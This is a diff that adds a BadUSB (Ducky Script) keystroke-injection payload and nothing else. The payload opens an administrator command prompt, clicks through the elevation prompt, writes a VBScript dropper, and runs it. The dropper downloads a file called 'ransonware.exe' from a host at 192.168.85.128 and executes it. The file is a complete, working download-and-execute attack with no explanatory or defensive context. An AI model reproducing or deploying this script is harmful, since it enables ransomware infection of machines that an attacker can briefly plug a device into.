@@ -1,0 +1,43 @@
+DELAY 700
+CTRL ESC
+DELAY 300
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING copy con c:\download_ransonware.vbs
+ENTER
+STRING Set oShell = CreateObject("WScript.Shell")
+ENTER
+STRING Path = oShell.ExpandEnvironmentStrings("%HOMEPATH%") 
+ENTER
+STRING Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+ENTER
+STRING Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+ENTER
+STRING xHttp.Open "GET", "http://192.168.85.128/ransonware.exe", False
+ENTER
+STRING xHttp.Send
+ENTER
+STRING With bStrm
+ENTER
+STRING .Type = 1
+ENTER
+STRING .Open
+ENTER
+STRING .write xHttp.responseBody
+ENTER
+STRING .savetofile Path + "\Documents\ransonware.exe", 2
+ENTER
+STRING End With
+ENTER
+STRING CreateObject("WScript.Shell").Run Path + "\Documents\ransonware.exe"
+ENTER
+DELAY 400
+CTRL z
+ENTER
+DELAY 400
+STRING c:\download_ransonware.vbs
+ENTER
